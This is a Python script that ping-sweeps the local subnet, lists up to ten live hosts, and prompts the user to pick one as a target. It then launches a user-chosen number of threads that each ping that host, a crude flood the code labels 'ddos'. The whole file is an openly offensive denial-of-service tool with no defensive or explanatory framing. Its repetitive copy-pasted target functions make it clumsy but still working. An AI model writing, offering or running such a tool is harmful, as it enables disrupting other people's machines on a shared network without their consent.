import os
import socket    
import multiprocessing
import subprocess
import threading

def pinger(job_q, results_q):
    """
    Do Ping
    :param job_q:
    :param results_q:
    :return:
    """
    DEVNULL = open(os.devnull, 'w')
    while True:

        ip = job_q.get()

        if ip is None:
            break

        try:
            subprocess.check_call(['ping', '-c1', ip],
                                  stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass


def get_my_ip():
    """
    Find my IP address
    :return:
    """
    print('20%')
    print('30%')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    print('45%')
    return ip


def map_network(pool_size=255):
    """
    Maps the network
    :param pool_size: amount of parallel ping processes
    :return: list of valid ip addresses
    """
    print('10%')
    ip_list = list()

    # get my IP and compose a base like 192.168.1.xxx
    ip_parts = get_my_ip().split('.')
    base_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.'
    print('65%')
    # prepare the jobs queue
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()

    pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]
    print('70%')
    for p in pool:
        p.start()
    print('75%')
    # cue hte ping processes
    for i in range(1, 255):
        jobs.put(base_ip + '{0}'.format(i))
    print('80%')
    for p in pool:
        jobs.put(None)
    print('90%')
    for p in pool:
        p.join()
    print('95%')
    # collect he results
    while not results.empty():
        ip = results.get()
        ip_list.append(ip)
    print('100%\n')
    return ip_list


if __name__ == '__main__':
    print('\nScanning...\n')
    print('0%')
    lst = map_network()
    print(lst)
    colv = len(lst)
    print('\n  Found {} Local IP'.format(colv))
    print()
    if colv >= 1:
        ip1 = str(lst[0])
        print('  1. ' + ip1)
    if colv >= 2:
        ip2 = str(lst[1])
        print('  2. ' + ip2)
    if colv >= 3:
        ip3 = str(lst[2])
        print('  3. ' + ip3)
    if colv >= 4:
        ip4 = str(lst[3])
        print('  4. ' + ip4)
    if colv >= 5:
        ip5 = str(lst[4])
        print('  5. ' + ip5)
    if colv >= 6:
        ip6 = str(lst[5])
        print('  6. ' + ip6)
    if colv >= 7:
        ip7 = str(lst[6])
        print('  7. ' + ip7)
    if colv >= 8:
        ip8 = str(lst[7])
        print('  8. ' + ip8)
    if colv >= 9:
        ip9 = str(lst[8])
        print('  9. ' + ip9)
    if colv >= 10:
        ip10 = str(lst[9])
        print('  10. ' + ip10)

    ddos_to = int(input('\n  Choose the target: '))
    NUM = input('\n  Number of threading: ')
    print('')

    def tar1():
        os.system('ping ' + ip1)
    def tar2():
        os.system('ping ' + ip2)
    def tar3():
        os.system('ping ' + ip3)
    def tar4():
        os.system('ping ' + ip4)
    def tar5():
        os.system('ping ' + ip5)
    def tar6():
        os.system('ping ' + ip6)
    def tar7():
        os.system('ping ' + ip7)
    def tar8():
        os.system('ping ' + ip8)
    def tar9():
        os.system('ping ' + ip9)
    def tar10():
        os.system('ping ' + ip10)

    if ddos_to == 1:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar1)
            t.start()
            value += 1
    if ddos_to == 2:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar2)
            t.start()
            value += 1
    if ddos_to == 3:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar3)
            t.start()
            value += 1
    if ddos_to == 4:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar4)
            t.start()
            value += 1
    if ddos_to == 5:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar5)
            t.start()
            value += 1
    if ddos_to == 6:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar6)
            t.start()
            value += 1
    if ddos_to == 7:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar7)
            t.start()
            value += 1
    if ddos_to == 8:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar8)
            t.start()
            value += 1
    if ddos_to == 9:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar9)
            t.start()
            value += 1
    if ddos_to == 10:
        value = 0
        for value in range(int(NUM)):
            t = threading.Thread(target=tar10)
            t.start()
            value += 1

    
